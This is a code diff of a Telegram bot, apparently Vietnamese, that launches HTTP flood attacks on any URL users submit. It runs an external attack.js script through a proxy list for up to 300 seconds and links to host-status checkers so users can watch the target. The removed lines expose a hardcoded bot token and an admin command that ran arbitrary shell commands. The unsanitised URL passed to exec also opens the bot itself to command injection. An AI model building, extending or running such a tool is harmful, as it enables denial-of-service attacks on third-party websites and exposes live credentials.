@@ -1,30 +1,72 @@
-const TelegramBot = require('node-telegram-bot-api'),
-    { exec } = require('child_process'),
-    token = '7831523452:AAECX05ntCb9_Aypg-RUM5NEzuIXBk4lhuc',
-    adminId = 7371969470,
-    allowedGroupIds = new Set([-1002411881962, -1002334544605, -1002365124072, -1002345371324, -1002434530321]),
-    bot = new TelegramBot(token, { polling: true }),
-    maxSlot = 1, maxCurrent = 3, maxTimeAttacks = 120;
 
+const TelegramBot = require('node-telegram-bot-api');
+const { exec } = require('child_process');
+const fs = require('fs');
+
+const adminIdFile = 'adminid.txt', allowedGroupIdsFile = 'groupid.txt', blacklistFile = 'blacklist.txt', tokenFile = 'token1.txt';
+let token, adminIds = new Set(), allowedGroupIds = new Set(), blacklist = [], botActive = true;
 let currentProcesses = 0, queue = [], userProcesses = {}, activeAttacks = {}, botStartTime = Date.now();
 
+// Load token, admin IDs, group IDs, and blacklist from files
+const loadConfig = () => {
+    try {
+        if (!fs.existsSync(tokenFile)) throw new Error('❌ File token.txt không tồn tại.');
+        token = fs.readFileSync(tokenFile, 'utf8').trim();
+        if (!token) throw new Error('❌ Token không hợp lệ.');
+
+        if (fs.existsSync(adminIdFile)) adminIds = new Set(fs.readFileSync(adminIdFile, 'utf8').split('\n').filter(id => id.trim()));
+        if (fs.existsSync(allowedGroupIdsFile)) allowedGroupIds = new Set(fs.readFileSync(allowedGroupIdsFile, 'utf8').split('\n').filter(id => id.trim()));
+        if (fs.existsSync(blacklistFile)) blacklist = fs.readFileSync(blacklistFile, 'utf8').split('\n').filter(url => url.trim());
+
+        if (adminIds.size === 0) console.warn('⚠️ File adminid.txt trống hoặc không tồn tại.');
+        if (allowedGroupIds.size === 0) console.warn('⚠️ File groupid.txt trống hoặc không tồn tại.');
+        if (blacklist.length === 0) console.warn('⚠️ File blacklist.txt trống hoặc không tồn tại.');
+    } catch (err) {
+        console.error(err.message);
+        process.exit(1);
+    }
+};
+
+loadConfig();
+const bot = new TelegramBot(token, { polling: true });
+
+const maxSlot = 1, maxCurrent = 3, maxTimeAttacks = 300;
+const helpMessage = `📜 Hướng dẫn sử dụng:
+➔ Lệnh chính xác: <code>https://example.com 120</code>
+⚠️ Lưu ý: Thời gian tối đa là ${maxTimeAttacks} giây.
+
+🔐 Quyền hạn:
+- Admin: Có thể chỉ định thời gian tùy ý (tối đa ${maxTimeAttacks} giây), sử dụng lệnh <code>/pkill</code>, <code>/on</code>, <code>/off</code>.
+- Người dùng thường: Thời gian tối đa 120 giây, không thể sử dụng lệnh admin.`;
+
+const sendHelp = (chatId, caller) => bot.sendMessage(chatId, `${caller ? `@${caller} ` : ''}${helpMessage}`, { parse_mode: 'HTML' });
+
 const initBot = () => {
-    bot.sendMessage(adminId, '[🤖Version PRO🤖] BOT Đang Chờ Lệnh.');
-    const helpMessage = `📜 Hướng dẫn sử dụng:\n➔ Lệnh chính xác: <code>https://example.com 120</code>\n⚠️ Lưu ý: Thời gian tối đa là ${maxTimeAttacks} giây.`;
+    if (adminIds.size > 0) bot.sendMessage(Array.from(adminIds)[0], '[🤖Version PRO🤖] BOT Đang Chờ Lệnh.').catch(err => console.error('❌ Không thể gửi thông báo khởi động đến admin:', err));
 
     bot.on('message', async msg => {
-        const { chat: { id: chatId }, text, from: { id: userId, username, first_name }, date } = msg,
-            isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId), caller = username || first_name;
+        const { chat: { id: chatId }, text, from: { id: userId, username, first_name }, date } = msg;
+        const isAdmin = adminIds.has(userId.toString()), isGroup = allowedGroupIds.has(chatId.toString()), caller = username || first_name;
 
         if (date * 1000 < botStartTime) return;
         if (!isAdmin && !isGroup) return bot.sendMessage(chatId, '❌ Bạn không có quyền sử dụng liên hệ: https://t.me/NeganSSHConsole.', { parse_mode: 'HTML' });
-        if (!text || !['http://', 'https://', 'exe ', '/help'].some(cmd => text.startsWith(cmd))) return;
-        if (text === '/help') return bot.sendMessage(chatId, helpMessage, { parse_mode: 'HTML' });
+        if (!text) return sendHelp(chatId, caller);
+
+        if (text === '/help') return sendHelp(chatId, caller);
 
         if (text.startsWith('http')) {
+            if (!botActive) return bot.sendMessage(chatId, '❌ Bot hiện đang tắt. Chỉ admin có thể bật lại.', { parse_mode: 'HTML' });
+
             const [host, time, full] = text.split(' ');
-            if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <code>https://example.com 120</code>.', { parse_mode: 'HTML' });
-            const attackTime = Math.min(parseInt(time, 10), maxTimeAttacks);
+            if (!host || isNaN(time)) return sendHelp(chatId, caller);
+
+            // Kiểm tra blacklist
+            const isBlacklisted = blacklist.some(blackUrl => host.includes(blackUrl));
+            if (isBlacklisted) return bot.sendMessage(chatId, '❌ Link này đã bị chặn ở blacklist không thể thực hiện lệnh.', { parse_mode: 'HTML' });
+
+            let attackTime = parseInt(time, 10);
+            if (isAdmin) attackTime = Math.min(attackTime, maxTimeAttacks);
+            else attackTime = Math.min(attackTime, 120);
 
             if (userProcesses[userId] >= maxSlot) return bot.sendMessage(chatId, `❌ Bạn đã đạt giới hạn số lượng tiến trình (${maxSlot}).`);
             if (currentProcesses >= maxCurrent) {
@@ -32,12 +74,12 @@ const initBot = () => {
                 return bot.sendMessage(chatId, '⏳ Yêu cầu được đưa vào hàng đợi...', { parse_mode: 'HTML' });
             }
 
-            const pid = Math.floor(Math.random() * 10000), endTime = Date.now() + attackTime * 1000;    
+            const pid = Math.floor(Math.random() * 10000), endTime = Date.now() + attackTime * 1000;
             activeAttacks[pid] = { userId, endTime };
             userProcesses[userId] = (userProcesses[userId] || 0) + 1;
             currentProcesses++;
 
-            const methods = full === 'full' ? ['GET', 'POST', 'HEAD'] : ['GET'];
+            const methods = full === 'full' && isAdmin ? ['GET', 'POST', 'HEAD'] : ['GET'];
             const startMessage = JSON.stringify({
                 Status: "✨🚀🛸 Successfully 🛸🚀✨",
                 Caller: caller,
@@ -48,16 +90,14 @@ const initBot = () => {
                 Maxtime: maxTimeAttacks,
                 Methods: methods.join(' '),
                 ConcurrentAttacks: currentProcesses,
-                StartTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }),
-                CheckHostURL: `Check Host (https://check-host.net/check-http?host=${host})`,
-                HostTracker: `Host Tracker (https://www.host-tracker.com/en/ic/check-http?url=${host})`
+                StartTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })
             }, null, 2);
 
-            await bot.sendMessage(chatId, startMessage, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` }, { text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]] } });
+            await bot.sendMessage(chatId, startMessage, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔍 Check Host', url: `https://check-host.net/check-http?host=${host}` }, { text: '🌐 Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]] } });
 
             let completedMethods = 0;
             methods.forEach(method => {
-                exec(`node --max-old-space-size=8192 ./negan -m ${method} -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
+                exec(`node --max-old-space-size=8192 ./attack.js -m ${method} -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
                     completedMethods++;
                     if (completedMethods === methods.length) {
                         const completeMessage = JSON.stringify({ Status: "👽 END ATTACK 👽", Caller: caller, "PID Attack": pid, Website: host, Methods: methods.join(' '), Time: `${attackTime} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) }, null, 2);
@@ -77,11 +117,36 @@ const initBot = () => {
             return;
         }
 
-        if (text.startsWith('exe ') && isAdmin) {
-            const cmd = text.slice(4);
-            if (!cmd) return bot.sendMessage(chatId, '🚫 Lệnh không được trống! VD: <code>exe ls</code>', { parse_mode: 'HTML' });
-            exec(cmd, { shell: '/bin/bash' }, (e, o, er) => bot.sendMessage(chatId, `🚀 Kết quả lệnh:\n<pre>${cmd}\n${o || er}</pre>`, { parse_mode: 'HTML' }));
+        if (text.startsWith('/pkill') || text.startsWith('/on') || text.startsWith('/off')) {
+            if (!isAdmin) return bot.sendMessage(chatId, '❌ Bạn không có quyền thực thi lệnh admin.', { parse_mode: 'HTML' });
+
+            if (text.startsWith('/pkill')) {
+                exec('pgrep -f attack.js', (e, stdout, stderr) => {
+                    if (e || !stdout.trim()) return bot.sendMessage(chatId, '❌ Không tìm thấy tiến trình đang chạy.', { parse_mode: 'HTML' });
+
+                    const pids = stdout.trim().split('\n').join(', ');
+                    exec(`pkill -f -9 attack.js`, (e, stdout, stderr) => {
+                        if (e) return bot.sendMessage(chatId, '❌ Lỗi khi thực hiện pkill.', { parse_mode: 'HTML' });
+                        bot.sendMessage(chatId, `✅ Đã kill hoàn toàn tiến trình. PID: ${pids}`, { parse_mode: 'HTML' });
+                    });
+                });
+                return;
+            }
+
+            if (text.startsWith('/on')) {
+                botActive = true;
+                bot.sendMessage(chatId, '✅ Bot đã được bật.', { parse_mode: 'HTML' });
+                return;
+            }
+
+            if (text.startsWith('/off')) {
+                botActive = false;
+                bot.sendMessage(chatId, '✅ Bot đã được tắt.', { parse_mode: 'HTML' });
+                return;
+            }
         }
+
+        sendHelp(chatId, caller);
     });
 };
 
